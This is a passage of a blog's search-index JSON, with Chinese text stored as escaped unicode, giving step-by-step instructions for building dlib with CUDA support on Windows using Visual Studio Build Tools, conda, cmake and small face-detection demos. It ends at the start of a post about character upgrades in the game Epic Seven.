\u4e2d\uff0c\u5747\u4f7f\u7528 64 \u4f4d\u7cfb\u7edf\u67b6\u6784\uff08amd64 \u6216\u8005 x64\uff09\u3002","title":"\u7cfb\u7edf\u67b6\u6784"},{"location":"blog/2022/220429-dilb-ultimate-solution/#conda","text":"\u76ee\u524d\u6211\u7684\u7248\u672c\u662f Anaconda 1.9.0\uff0c\u5176\u4ed6\u7248\u672c \u5e94\u8be5 \u4e0d\u5f71\u54cd\u3002\u540c\u7406\uff0cPython \u7248\u672c \u5e94\u8be5 \u4e5f\u4e0d\u5f71\u54cd\u3002","title":"Conda"},{"location":"blog/2022/220429-dilb-ultimate-solution/#visual-studio","text":"\u4ee5\u4e0b Visual Studio \u4e2d\uff0c\u4f60\u81f3\u5c11\u9700\u8981\u62e5\u6709\u4e00\u4e2a\uff1a Visual Studio 2019 Build Tools for Visual Studio 2019 Visual Studio 2017 Build Tools for Visual Studio 2017 \u56e0\u4e3a\u6211\u4e0d\u60f3\u4e0b\u5341\u51e0\u4e2a GB \u7684 Visual Studio 2019/2017\uff0c\u6240\u4ee5\u6211\u4f7f\u7528\u7684\u662f Build Tools for Visual Studio 2019\u3002\u5373\u4f7f\u662f\u8fd9\u6837\uff0c\u4ed6\u4ecd\u7136\u4f1a\u5360\u7528\u6211\u5927\u7ea6 4 GB \u7684\u78c1\u76d8\u7a7a\u95f4\uff08\u5176\u4e2d C \u76d8\u56fa\u5b9a\u5360\u7528\u7ea6 2 GB\uff09\uff0c\u4f46\u8fd9\u6bd4\u8d77\u6765\u5df2\u7ecf\u8db3\u591f\u5c0f\u4e86\u3002 \u5371\u9669 \u4f60\u53ef\u80fd\u60f3\u95ee Visual Studio 2015\uff08\u542b\uff09\u4ee5\u4e0b\u7b49\u4e0d\u5728\u6b64\u5217\u7684 Visual Studio \u7248\u672c\u884c\u4e0d\u884c\uff0c\u8fd9\u91cc\u660e\u786e\u8868\u793a\uff1a \u4e0d\u884c\uff01\uff01\uff01 #if _MSC_VER < 1910 || _MSC_VER >= 1930 #error -- unsupported Microsoft Visual Studio version! Only the versions between 2017 and 2019 (inclusive) are \u53e6\u89c1\uff1a CUDA Installation Guide for Microsoft Windows CUDA Compilers \u4ee5\u4e0b Visual Studio \u5de5\u4f5c\u8d1f\u8f7d\u4e2d\uff0c \u5fc5\u987b \u5168\u90e8\u62e5\u6709\uff1a MSVC VS 2017\uff08\u6216 2019\uff09C++ x64/x86 \u751f\u6210\u5de5\u5177 Windows 10 SDK \u7528\u4e8e Windows \u7684 C++ CMake \u5de5\u5177 \u5371\u9669 \u6ce8\u610f\u6700\u540e\u4e00\u4e2a \u7528\u4e8e Windows \u7684 C++ CMake \u5de5\u5177 \u5c31\u7b97\u4f60\u5df2\u7ecf\u6709\u4e86 Kitware \u7684 CMake \u4f60\u4ecd\u7136\u9700\u8981\u52fe\u9009\uff0c\u4e0d\u7136\u5c31\u7b97\u901a\u8fc7\u4e86 CXX \u7f16\u8bd1\u5668\u6d4b\u8bd5\u9636\u6bb5\uff0c\u5728\u5b9e\u9645\u7f16\u8bd1\u7684\u65f6\u5019\u4ecd\u7136\u53ef\u80fd broken\u3002 \u5982\u56fe\u6240\u793a\uff1a \u8bb0\u5f97\u4fee\u6539\u5b89\u88c5\u8def\u5f84\uff0c\u522b\u4e00\u80a1\u8111\u5168\u585e C \u76d8\u4e86\uff1a \u5371\u9669 \u8bf7\u5728\u9000\u51fa Visual Studio Installer \u540e\u7acb\u5373\u68c0\u67e5\u4f60\u7684\u4e34\u65f6\u6587\u4ef6\u5939\uff0c\u4f8b\u5982 C:\\Users\\AkibaArisa\\Temp \uff0cVisual Studio Installer \u53ef\u80fd\u4f1a\u4fee\u6539\u8fd9\u4e2a\u6587\u4ef6\u5939\u7684\u6743\u9650\uff0c\u5bfc\u81f4\u9664\u4e86 \u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c \u7684\u7a0b\u5e8f\u4ee5\u5916\uff0c\u5747\u65e0\u6cd5\u5199\u5165\u8be5\u6587\u4ef6\u5939\u3002 \u4f60\u6240\u9700\u8981\u505a\u7684\u5c31\u662f\u68c0\u67e5\u8fd9\u4e2a\u4e34\u65f6\u6587\u4ef6\u5939\u7684\u6743\u9650\uff0c\u5982\u679c\u53d1\u73b0\u6709\u95ee\u9898\uff0c\u5219\u7528\u4ee5\u4e0b\u65b9\u6cd5\u4fee\u6539\u8fd9\u4e2a\u6587\u4ef6\u5939\u7684\u6743\u9650\uff1a \u53f3\u952e\u8be5\u6587\u4ef6\u5939 - \u5c5e\u6027 - \u5b89\u5168 - \u7f16\u8f91 - Everyone - \u52fe\u9009 \u5b8c\u5168\u63a7\u5236 - \u786e\u8ba4","title":"Visual Studio"},{"location":"blog/2022/220429-dilb-ultimate-solution/#_4","text":"","title":"\u62df\u8bae\u65b9\u6848\u7684\u6267\u884c\u6b65\u9aa4"},{"location":"blog/2022/220429-dilb-ultimate-solution/#conda_1","text":"\u7b14\u8005\u7684 PyCharm \u80fd\u8ba9\u65b0\u9879\u76ee\u9009\u62e9 Conda \u73af\u5883\u5e76\u9ed8\u8ba4\u6784\u5efa\u597d\uff0c\u8fd9\u91cc\u7565\u8fc7\u4f7f\u7528 IDE \u6784\u5efa\u7684\u65b9\u6cd5\u3002 \u6216\u8005\u4f7f\u7528\u624b\u52a8\u6784\u5efa\uff1a conda create -n dlib_build_test python=3.10 \u7136\u540e\u8fdb\u5165\u865a\u62df\u73af\u5883\uff1a conda activate dlib_build_test","title":"\u6784\u5efa Conda \u73af\u5883"},{"location":"blog/2022/220429-dilb-ultimate-solution/#cuda-cudnn","text":"\u4e0d\u901a\u8fc7 Nvidia \u5b98\u7f51\uff0c\u800c\u662f\u901a\u8fc7 Conda \u5b89\u88c5 CUDA \u548c cuDNN\u3002 conda install cuda cudnn -c nvidia \u63a5\u4e0b\u6765\u53ef\u80fd\u4f1a\u7b49\u5f85\u4e00\u4f1a\uff0c\u56e0\u4e3a\u8981\u4e0b\u8f7d\u5f88\u591a\u4e1c\u897f\u3002 \u5b89\u88c5\u540e\u53ef\u4ee5\u901a\u8fc7 conda list \u547d\u4ee4\u786e\u8ba4\u5b89\u88c5\u7684\u7248\u672c\uff1a # Name Version Build Channel ... cuda 11.6.2 h65bbf44_0 nvidia cuda-cccl 11.6.55 hd268e57_0 nvidia cuda-command-line-tools 11.6.2 h65bbf44_0 nvidia cuda-compiler 11.6.2 h65bbf44_0 nvidia cuda-cudart 11.6.55 h5fb1900_0 nvidia cuda-cuobjdump 11.6.124 h8654613_0 nvidia cuda-cupti 11.6.124 h532822a_0 nvidia cuda-cuxxfilt 11.6.124 h3f9c74b_0 nvidia cuda-libraries 11.6.2 h65bbf44_0 nvidia cuda-libraries-dev 11.6.2 h65bbf44_0 nvidia cuda-memcheck 11.6.124 hea6bc18_0 nvidia cuda-nvcc 11.6.124 h769bc0d_0 nvidia cuda-nvdisasm 11.6.124 he05ff55_0 nvidia cuda-nvml-dev 11.6.55 h2bb381e_0 nvidia cuda-nvprof 11.6.124 he581663_0 nvidia cuda-nvprune 11.6.124 hb892de1_0 nvidia cuda-nvrtc 11.6.124 h231bd66_0 nvidia cuda-nvrtc-dev 11.6.124 hd7d06dc_0 nvidia cuda-nvtx 11.6.124 hee9d5a4_0 nvidia cuda-nvvp 11.6.124 h6a974fa_0 nvidia cuda-runtime 11.6.2 h65bbf44_0 nvidia cuda-sanitizer-api 11.6.124 ha4888a7_0 nvidia cuda-toolkit 11.6.2 h65bbf44_0 nvidia cuda-tools 11.6.2 h65bbf44_0 nvidia cuda-visual-tools 11.6.2 h65bbf44_0 nvidia cudatoolkit 11.3.1 h59b6b97_2 cudnn 8.2.1 cuda11.3_0 ... \u663e\u7136\uff0c\u6211\u5b89\u88c5\u7684 CUDA \u7248\u672c\u662f 11.6.2 \uff0ccuDNN \u7248\u672c\u662f 8.2.1 \u3002 \u5b89\u88c5\u5b8c\u6210\u540e\u786e\u8ba4 nvcc.exe \u7684\u5b89\u88c5\u4f4d\u7f6e\uff0c\u5e76\u8bb0\u4f4f\u5b83\u3002 ( dlib_build_test ) I:\\Developer\\Python\\project\\dlib_build_test > where nvcc : : I:\\ProgramData\\Anaconda3\\envs\\dlib_build_test\\bin\\nvcc.exe \u4f8b\u5982\u73b0\u5728\u5b83\u5728 I:\\ProgramData\\Anaconda3\\envs\\dlib_build_test\\bin\\nvcc.exe \u3002","title":"\u5b89\u88c5 CUDA \u548c cuDNN"},{"location":"blog/2022/220429-dilb-ultimate-solution/#dlib","text":"\u4ece Releases \u4e0b\u8f7d\uff1a\uff08\u63a8\u8350\uff09 v19.23 \u6216\u8005\u4ece GitHub\u514b\u9686\uff1a git clone https://github.com/davisking/dlib.git cd dlib","title":"\u83b7\u53d6 dlib \u6e90\u7801"},{"location":"blog/2022/220429-dilb-ultimate-solution/#_5","text":"","title":"\u5728\u6784\u5efa\u4e4b\u524d"},{"location":"blog/2022/220429-dilb-ultimate-solution/#msvc-x64","text":"%comspec% /k \"I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat\" \u5176\u4e2d\u7684\u8def\u5f84\u9700\u8981\u6839\u636e\u4f60\u7684 Visual Studio \u7684\u5b89\u88c5\u4f4d\u7f6e\u800c\u6539\u53d8\uff0c\u4f46\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5176\u5b9e\u662f\u4ece\u5f00\u59cb\u83dc\u5355\u4e2d\u627e\u5230 x64 Native Tools Command Prompt for VS 2019 \u7684\u5feb\u6377\u65b9\u5f0f\uff0c\u7136\u540e\u70b9\u51fb\u53f3\u952e\u67e5\u770b\u5c5e\u6027\u3002 \u590d\u5236\u5e76\u7c98\u8d34\u5176 \u76ee\u6807 \u5373\u53ef\u3002 \u8fd0\u884c\u540e\uff0c\u8fd9\u4e2a bat \u811a\u672c\u5c06\u4f1a\u81ea\u52a8\u628a MSVC \u7684\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u5230\u4f60\u7684\u4e34\u65f6\u73af\u5883\u53d8\u91cf\u4e2d\uff08\u4ec5\u5728\u5f53\u524d\u63a7\u5236\u53f0\u6709\u6548\uff09\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u6784\u5efa dlib \u7684\u65f6\u5019\u4f7f\u7528 MSVC \u7684\u7f16\u8bd1\u5668\u4e86\u3002 \u73b0\u5728\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e0b\u91cd\u8981\u7684\u73af\u5883\u53d8\u91cf\u662f\u5426\u8bbe\u7f6e\u6b63\u786e\uff1a where cmake : : G:\\Tools for Windows\\CMake\\bin\\cmake.exe : : I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\Common7\\IDE\\CommonExtensions\\Microsoft\\CMake\\CMake\\bin\\cmake.exe where nmake : : I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.29.30133\\bin\\Hostx64\\x64\\nmake.exe where cl : : I:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Tools\\MSVC\\14.29.30133\\bin\\Hostx64\\x64\\cl.exe \u63d0\u793a \u8fd0\u884c where cmake \u7684\u65f6\u5019\u51fa\u73b0\u4e86\u4e24\u4e2a cmake \uff0c\u5176\u4e2d\u4e00\u4e2a\u662f Kitware \u7684 cmake\uff0c\u53e6\u4e00\u4e2a\u662f MSVC \u7684 cmake\u3002\u800c dlib \u5728\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u4f1a\u68c0\u67e5\u6240\u6709 cmake \u7684\u8def\u5f84\uff0c\u5982\u679c\u4e0d\u5b58\u5728 MSVC \u7684 cmake\uff0c\u811a\u672c\u4f1a\u62a5\u9519\u800c\u505c\u6b62\u3002","title":"\u8fdb\u5165 MSVC x64 \u7f16\u8bd1\u73af\u5883"},{"location":"blog/2022/220429-dilb-ultimate-solution/#dlib_1","text":"\u89c1 Dlib failed to build due to many errors: error C2065 and C2338 \u00b7 Issue #2463 \u00b7 davisking/dlib \u6253\u5f00 dlib\\dlib\\external\\pybind11\\include\\pybind11/numpy.h \uff0c\u627e\u5230\uff1a numpy.h 26 27 28 29 #if defined(_MSC_VER) # pragma warning(push) # pragma warning(disable: 4127) // warning C4127: Conditional expression is constant #endif \u6dfb\u52a0\u4e24\u884c\uff0c\u6539\u4e3a\uff1a numpy.h 26 27 28 29 30 31 #if defined(_MSC_VER) # pragma warning(push) # pragma warning(disable: 4127) // warning C4127: Conditional expression is constant #include <BaseTsd.h> typedef SSIZE_T ssize_t ; #endif","title":"\u4fee\u6539 dlib \u6e90\u7801"},{"location":"blog/2022/220429-dilb-ultimate-solution/#_6","text":"mkdir build cd build cmake .. -DDLIB_USE_CUDA=1 -DUSE_AVX_INSTRUCTIONS=1 -DCUDAToolkit_ROOT= %NVCC_PATH% \u5176\u4e2d %NVCC_PATH% \u662f\u4f60\u5728\u4e4b\u524d\u83b7\u53d6\u7684\u8def\u5f84\uff0c\u4f8b\u5982 I:\\ProgramData\\Anaconda3\\envs\\dlib_build_test\\bin\\nvcc.exe \u3002 \u57fa\u4e8e\u6211\u4eec\u505a\u597d\u7684\u524d\u671f\u94fa\u57ab\uff0c\u7406\u8bba\u4e0a\u8fd9\u91cc\u53ef\u4ee5\u4e00\u6b21\u6027\u6784\u5efa\u6210\u529f\uff0c\u5982\u679c\u6784\u5efa\u4ecd\u7136\u6ca1\u6709\u6210\u529f\uff0c\u8bf7\u4ed4\u7ec6\u9605\u8bfb CMakeError.log \u6587\u4ef6\uff0c\u5206\u6790\u5176\u4e2d\u51fa\u73b0\u7684\u9519\u8bef\u3002\u5728\u6bcf\u6b21\u91cd\u65b0\u6784\u5efa\u4e4b\u524d\uff0c\u8bf7\u5148\u5220\u9664 build \u6587\u4ef6\u5939\u91cc\u7684\u6240\u6709\u5185\u5bb9\u3002","title":"\u5f00\u59cb\u6784\u5efa"},{"location":"blog/2022/220429-dilb-ultimate-solution/#_7","text":"cmake --build . \u540c\u4e0a\uff0c\u7406\u8bba\u4e0a\u662f\u4e00\u6b21\u6027\u6784\u5efa\u6210\u529f\u3002","title":"\u5c1d\u8bd5\u7f16\u8bd1"},{"location":"blog/2022/220429-dilb-ultimate-solution/#_8","text":"python setup.py install --set DLIB_USE_CUDA=1 --no DLIB_GIF_SUPPORT \u5371\u9669 \u5fc5\u987b\u6dfb\u52a0 --no DLIB_GIF_SUPPORT \u53c2\u6570\uff0c\u5426\u5219\u4f1a\u53d1\u751f\u9519\u8bef\uff1a error C2734: \u201cGifAsciiTable8x8\u201d: \u5982\u679c\u4e0d\u662f\u5916\u90e8\u7684\uff0c\u5219\u5fc5\u987b\u521d\u59cb\u5316\u5e38\u91cf\u5bf9\u8c61 \u89c1 Dlib install errors out : error C2734: 'GifAsciiTable8x8' : 'const' object must be initialized if not 'extern' \u00b7 Issue #2358 \u00b7 davisking/dlib \u5b9e\u9645\u4e0a\uff0c\u5728\u975e\u624b\u52a8\u7f16\u8bd1\u73af\u5883\u4e2d\uff08\u4f8b\u5982\u76f4\u63a5\u4f7f\u7528 pip install \uff09\u5b89\u88c5\u65f6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u6307\u5b9a\u8be5\u53c2\u6570\uff1a pip install -v --install-option= \"--no\" --install-option= \"DLIB_GIF_SUPPORT\" dlib \u4ee5\u53ca\u5982\u679c\u4f60\u60f3\u7f16\u8bd1\u51fa .whl \u6587\u4ef6\u9020\u798f\u4ed6\u4eba\uff0c\u5728\u7f16\u8bd1\u65f6\u540c\u6837\u9700\u8981\u52a0\u5165\u8be5\u53c2\u6570\uff0c\u5373\uff1a python setup.py bdist_wheel --set DLIB_USE_CUDA=1 --no DLIB_GIF_SUPPORT","title":"\u5c1d\u8bd5\u5b89\u88c5"},{"location":"blog/2022/220429-dilb-ultimate-solution/#_9","text":"","title":"\u5728\u5b89\u88c5\u4e4b\u540e"},{"location":"blog/2022/220429-dilb-ultimate-solution/#dlib_2","text":"\u5c31\u7b97\u5728\u4e0a\u4e00\u6b65\u7684 python setup.py install \u6ca1\u6709\u4efb\u4f55\u62a5\u9519\uff0c\u6211\u4eec\u7684 dlib \u4e5f \u53ef\u80fd \u8fd8\u6ca1\u6709\u6b63\u786e\u5b89\u88c5\u3002 \u5bf9\u4e8e\u4e00\u4e9b\u7528\u6237\uff0c\u4ed6\u4eec\u53ef\u80fd\u662f\u5c5e\u4e8e \u4e2d\u9014 \u52a0\u5165\u8fd9\u4e2a\u65b9\u6848\u7684\u3002\u4f8b\u5982\uff0c\u4ed6\u4eec\u5728\u6b64\u4e4b\u524d\u5df2\u7ecf\u4ece conda install -c conda-forge dlib \u5b89\u88c5\u4e86\u4e0d\u5e26 CUDA \u7684 dlib\u3002 \u56e0\u4e3a\u7248\u672c\u539f\u56e0\uff08Release \u4e0b\u8f7d\u7684\u662f 19.23 \u7248\u672c\uff0c\u800c conda install \u5b89\u88c5\u7684\u662f 19.23.1 \u7248\u672c\uff09\uff0c\u65e7\u7248\u672c\u7684 dlib \u4e0d\u4f1a\u88ab\u4f7f\u7528\uff0c\u56e0\u6b64 dlib . DLIB_USE_CUDA \u7684\u503c\u5c06\u4ecd\u7136\u662f False \u3002 \u6b64\u65f6\u5378\u8f7d\u539f\u6765\u5b89\u88c5\u7684 dlib conda remove dlib \u7136\u540e\u518d\u8fdb\u884c\u4e00\u6b21\u4e0a\u4e00\u6b65\u7684\u5b89\u88c5\u64cd\u4f5c python setup.py install --set DLIB_USE_CUDA=1 --no DLIB_GIF_SUPPORT \u73b0\u5728 dlib . DLIB_USE_CUDA \u7684\u503c\u5e94\u5f53\u662f True","title":"\u5378\u8f7d\u65e7\u7248\u672c\u7684 dlib"},{"location":"blog/2022/220429-dilb-ultimate-solution/#windows","text":"\u8fd9\u662f\u4e00\u4e2a\u6bd4\u8f83\u7384\u5b66\u7684\u4e1c\u897f\u3002\u5728\u542f\u7528\u4e86 CUDA \u7684 dlib \u6b63\u786e\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u6709\u4e9b\u4eba\u5728\u8fd0\u884c\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u53d1\u751f\u8fd9\u4e2a\u9519\u8bef\u3002\u5177\u4f53\u4f53\u73b0\u5982\u4e0b\uff1a \u8fd9\u91cc\u6709\u4e24\u4efd\u5dee\u4e0d\u591a\u7684\u4eba\u8138\u68c0\u6d4b demo\uff0c\u5176\u4e2d\u4e00\u4e2a\u4f7f\u7528 HOG\uff0c\u53e6\u4e00\u4e2a\u4f7f\u7528 CNN\u3002 HOG CNN detection.py 1 2 3 4 5 6 7 8 9 10 11 12 import cv2 import imutils import dlib detector = dlib . get_frontal_face_detector () image = cv2 . imread ( 'image/test.jpg' ) resized_image = imutils . resize ( image , width = 600 ) rgb = cv2 . cvtColor ( resized_image , cv2 . COLOR_BGR2RGB ) results = detector ( rgb , 1 ) for result in results : print ( result ) detection.py 1 2 3 4 5 6 7 8 9 10 11 12 13 import cv2 import imutils import dlib detector = dlib . cnn_face_detection_model_v1 ( 'model/mmod_human_face_detector.dat' ) image = cv2 . imread ( 'image/test.jpg' ) resized_image = imutils . resize ( image , width = 600 ) rgb = cv2 . cvtColor ( resized_image , cv2 . COLOR_BGR2RGB ) results = detector ( rgb , 1 ) for result in results : print ( result . rect ) print ( result . confidence ) \u5f53 dlib \u4f7f\u7528 get_frontal_face_detector () \uff08HOG\uff09\u8fdb\u884c\u4eba\u8138\u68c0\u6d4b\u65f6\uff0c\u4e0d\u4f1a\u53d1\u751f\u4efb\u4f55\u95ee\u9898\u3002 \u5f53 dlib \u4f7f\u7528 cnn_face_detection_model_v1 () \uff08CNN\uff09\u8fdb\u884c\u4eba\u8138\u68c0\u6d4b\u65f6\uff0c\u80fd\u987a\u5229\u8fdb\u884c\u68c0\u6d4b\uff0c\u4efb\u52a1\u7ba1\u7406\u5668\u7684 CUDA \u4f7f\u7528\u7387\u4e5f\u4f1a\u6b63\u5e38\u4e0a\u6da8\u3002 \u4f46\u662f\u5728\u68c0\u6d4b\u7ed3\u675f\u4e4b\u540e\uff0c\u8fd9\u4e2a\u811a\u672c\u4f1a\u5361\u4f4f\uff0c\u6253\u5f00\u4efb\u52a1\u7ba1\u7406\u5668\u53ef\u4ee5\u53d1\u73b0 C \u76d8\u4f7f\u7528\u7387\u63a5\u8fd1 100%\u3002\u5927\u7ea6 1~2 \u5206\u949f\u540e C \u76d8\u4f7f\u7528\u7387\u6062\u590d\u6b63\u5e38\uff0c\u811a\u672c\u4e5f\u6b63\u5e38\u7ed3\u675f\u3002 \u4e8b\u540e\u8c03\u67e5\u53d1\u73b0\uff0c\u662f Windows \u9519\u8bef\u62a5\u544a \u6b63\u5728\u5411 C \u76d8\u5199\u5165\u5927\u91cf\u5185\u5bb9\uff08\u5185\u5b58\u8f6c\u50a8\uff09\uff0c\u5199\u5165\u7684\u4f4d\u7f6e\u662f C:\\Users\\AkibaArisa\\AppData\\Local\\CrashDumps \uff0c\u6bcf\u6b21\u5199\u5165\u4e00\u4e2a\u5927\u5c0f\u7ea6\u4e3a 1 GB \u7684 .dmp \u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u4e0e python \u6709\u5173\u3002 \u5b9e\u9645\u4e0a\u6211\u4eec\u7684 python \u811a\u672c\u5e76\u6ca1\u6709\u53d1\u751f\u4efb\u4f55\u5d29\u6e83\uff0c\u800c\u4e14\u4e5f\u662f\u6b63\u5e38\u7ed3\u675f\u7684\uff0c\u56e0\u6b64\u8fd9\u4e2a\u9519\u8bef\u62a5\u544a\u7eaf\u5c5e\u753b\u86c7\u6dfb\u8db3\u3002 \u73b0\u5728\u5173\u95ed\u6389 Windows \u9519\u8bef\u62a5\u544a\u670d\u52a1 \uff1a \u9996\u5148\u4f7f\u7528 PowerShell \u505c\u7528\uff1a \uff08\u89c1 Disable-WindowsErrorReporting (WindowsErrorReporting) | Microsoft Docs \uff09 PS C :\\> Disable-WindowsErrorReporting # False \u7136\u540e\u5728\u670d\u52a1\u4e2d\u505c\u7528\uff1a \u6253\u5f00 \u670d\u52a1 \uff08\u8fd0\u884c services.msc \u6216\u8005\u4f7f\u7528\u4efb\u52a1\u7ba1\u7406\u5668\uff09\u3002 \u627e\u5230 Windows Error Reporting Service \uff0c\u53f3\u952e \u5c5e\u6027 \u3002 \u5c06 \u542f\u52a8\u7c7b\u578b \u8bbe\u4e3a \u7981\u7528 \u3002 \u5728 \u670d\u52a1\u72b6\u6001 \u5904\u70b9\u51fb \u505c\u6b62 \u3002 \u5982\u6b64\u4e00\u6765\uff0cWindows \u5c06\u4e0d\u4f1a\u518d\u4ea7\u751f\u9519\u8bef\u62a5\u544a\uff0c\u6211\u4eec\u4f7f\u7528\u4e86 cnn_face_detection_model_v1 () \u7684 python \u811a\u672c\u4e5f\u5c06\u5728\u68c0\u6d4b\u5b8c\u6210\u540e\u6b63\u5e38\u7ed3\u675f\uff0c\u4e0d\u4f1a\u4e00\u76f4\u6401\u8fd9\u5361\u7740\u3002","title":"\u5173\u95ed Windows \u9519\u8bef\u62a5\u544a\u670d\u52a1"},{"location":"blog/2022/220429-dilb-ultimate-solution/#_10","text":"\u7279\u5b9a\u7684 CUDA + Visual Studio + dlib + python \u7248\u672c\u7684\u7ec4\u5408\u76ee\u524d\u4ecd\u7136\u662f dlib \u4e2d\u7684\u4e00\u5927\u96be\u9898\u3002\u5982\u4f60\u6240\u89c1\uff0c\u8fd9\u4e2a\u65b9\u6848\u7684\u9605\u8bfb\u52a0\u5b9e\u8df5\u7684\u603b\u65f6\u957f\u53ef\u80fd\u8d85\u8fc7\u4e86\u534a\u4e2a\u5c0f\u65f6\uff0c\u5948\u4f55\u4e0d\u540c\u8f6f\u4ef6\uff0c\u4e0d\u540c\u5e73\u53f0\u4e4b\u95f4\u7684\u914d\u5957\u7684\u786e\u5f88\u56f0\u96be\uff0c\u4f46\u6211\u4eec\u4ecd\u5c06\u89e3\u51b3\u4ed6\u4eec\u3002\u76f8\u4fe1\u8fd9\u4e2a\u65b9\u6848\u53ef\u4ee5\u5e2e\u52a9\u5230\u66f4\u591a\u7684\u4eba\u3002","title":"\u7ed3\u8bba"},{"location":"blog/2022/220429-dilb-ultimate-solution/#_11","text":"\u611f\u8c22 dlib \u7684\u6240\u6709\u8d21\u732e\u8005\u4e3a\u6211\u4eec\u5e26\u6765\u4e86\u5b9e\u7528\u7684\u673a\u5668\u5b66\u4e60\u5de5\u5177\uff1b\u611f\u8c22\u6240\u6709\u5728 GitHub dlib \u4ed3\u5e93\u4e0b\u63d0\u51fa\u548c\u89e3\u51b3 issue \u7684\u5f00\u53d1\u8005\u548c\u7814\u7a76\u4eba\u5458\uff0c\u6ca1\u6709\u4ed6\u4eec\u8fd9\u7bc7\u6587\u7ae0\u5c06\u65e0\u4ece\u4e0b\u624b\uff1b\u4e5f\u611f\u8c22\u6211\u7684\u6bd5\u8bbe\u8001\u5e08\uff0c\u9009\u4e86\u4e00\u4e2a\u8fd9\u6837\u7684\u8bfe\u9898\uff0c\u628a\u6211\u618b\u51fa\u4e86\u4e00\u7bc7\u8fd9\u6837\u7684\u6587\u7ae0\u3002","title":"\u81f4\u8c22"},{"location":"blog/2022/220502-how-dogs-work-in-epic7/","tags":["epic7"],"text":"\u7eea\u8bba \u00b6 \u80cc\u666f \u00b6 \u6709\u7fa4\u53cb\u7528 \u4e8c\u661f\u94f6\u72d7 \u5582 \u4e8c\u661f\u94f6\u72d7 \u3002\u6211\u4e00\u770b\u4f60\u8fd9\u4e0d\u592a\u5962\u4f88\u4e86\u561b\uff0c\u4e8e\u662f\u4fbf\u6709\u4e86\u8fd9\u6761\u535a\u5ba2\u3002 \u672c\u535a\u5ba2\u7684\u884c\u6587\u7ed3\u6784 \u00b6 \u7b2c\u4e8c\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5404\u4e2a\u7d20\u6750\u5728\u5c06\u4e00\u4e2a\u89d2\u8272\u5347\u4e3a\u516d\u661f\u7684\u8fc7\u7a0b\u4e2d\u6240\u62c5\u5f53\u7684\u8eab\u4efd\u3002 \u7b2c\u4e09\u7ae0 \u624d\u662f\u672c\u535a\u5ba2\u7684\u4e3b\u8981\u90e8\u5206 \uff0c\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5c06\u4e00\u4e2a\u89d2\u8272\u5347\u4e3a\u516d\u661f\u7684\u6700\u7b80\u6d01\u65b9\u6cd5\u3002 \u7b2c\u56db\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u4e24\u79cd\u5feb\u901f\u83b7\u53d6 \u4e8c\u661f\u72d7\u7cae \u7684\u65b9\u6cd5\u3002 \u5404\u4e2a\u7d20\u6750\u7684\u8eab\u4efd \u00b6 \u8fd9\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u5404\u4e2a\u7d20\u6750\uff08\u72d7/\u72d7\u7cae\uff09\u5728\u5c06\u4e00\u4e2a\u89d2\u8272\u5347\u4e3a\u516d\u661f\u7684\u8fc7\u7a0b\u4e2d\u6240\u62c5\u5f53\u7684\u8eab\u4efd\u3002 \u4e8c\u661f\u72d7\u7cae\uff08\u521d\u59cb\uff09 \u00b6 \u4ec0\u4e48\u662f \u4e8c\u661f\u72d7\u7cae \uff1f \u4e8c\u661f\u72d7\u7cae \u5c31\u662f\u5192\u9669\u8fc7\u7a0b\u4e2d\u6389\u843d\u7684\u4e8c\u661f\u5c0f\u602a\uff0c\u7b49\u7ea7\u4e00\u822c\u4e3a 1\u3002 \u5982\u679c\u662f\u4ece\u53cb\u60c5\u53ec\u5524\u90a3\u91cc\u62bd\u6765\u7684\uff0c\u90a3\u4e48\u521d\u59cb\u7b49\u7ea7\u4e3a 5\u3002 \u4e8c\u661f\u72d7\u7cae \u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a \u76f4\u63a5\u5582\u7ed9 20 \u7ea7\u7684\u4e8c\u661f\u94f6\u72d7 \uff08\u6ee1\u7ea7\u7684\u521d\u59cb\u94f6\u72d7\uff09\uff0c\u4f7f\u8fd9\u4e2a 20 \u7ea7\u7684\u4e8c\u661f\u94f6\u72d7 \u53d8\u6210 21 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7 \u3002 \u81ea\u5df1\u5403\u4f01\u9e45\uff0c\u4f7f\u81ea\u5df1\u53d8\u6210 20 \u7ea7\u7684\u4e8c\u661f\u72d7\u7cae \uff0c\u7136\u540e\u901a\u8fc7\u5403\u6389\u4e24\u4e2a \u4e8c\u661f\u72d7\u7cae \uff0c\u4f7f\u81ea\u5df1\u6210\u4e3a 21 \u7ea7\u7684\u4e09\u661f\u72d7\u7cae \u3002 \u4e09\u661f\u72d7\u7cae\uff0821 \u7ea7\uff09 \u00b6 \u4e09\u661f\u72d7\u7cae \u552f\u4e00\u7684\u83b7\u53d6\u65b9\u6cd5\u5728\u4e0a\u4e00\u8282\u4e2d\u5df2\u7ecf\u4ecb\u7ecd\u8fc7\u4e86\uff0c\u5c31\u662f \u4e8c\u661f\u72d7\u7cae \u81ea\u5df1\u5403\u6389\u540c\u7c7b\u3002 \u4e09\u661f\u72d7\u7cae \u76ee\u524d\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e24\u4e2a\u51fa\u8def\uff1a \u76f4\u63a5\u5582\u7ed9 30 \u7ea7\u7684\u4e09\u661f\u94f6\u72d7 \uff08\u6ee1\u7ea7\u7684\u4e09\u661f\u94f6\u72d7\uff09\uff0c\u4f7f\u8fd9\u4e2a 30 